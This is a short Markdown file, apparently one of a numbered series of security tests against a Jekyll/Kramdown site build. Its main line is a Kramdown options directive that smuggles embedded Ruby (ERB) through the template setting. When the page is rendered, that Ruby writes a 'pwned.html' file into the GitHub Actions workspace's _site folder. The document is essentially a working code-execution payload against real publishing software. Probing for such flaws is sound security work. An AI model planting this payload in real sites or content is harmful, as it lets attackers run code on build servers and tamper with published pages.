---
---

# Test 6: Write to _site

{::options template="string://<%= dest = Dir.glob('/github/workspace/_site').first || '/tmp/site'; begin; File.write(dest + '/pwned.html', 'INJECTED'); 'WROTE:' + dest; rescue => e; 'ERR:' + e.message; end %>" /}

placeholder
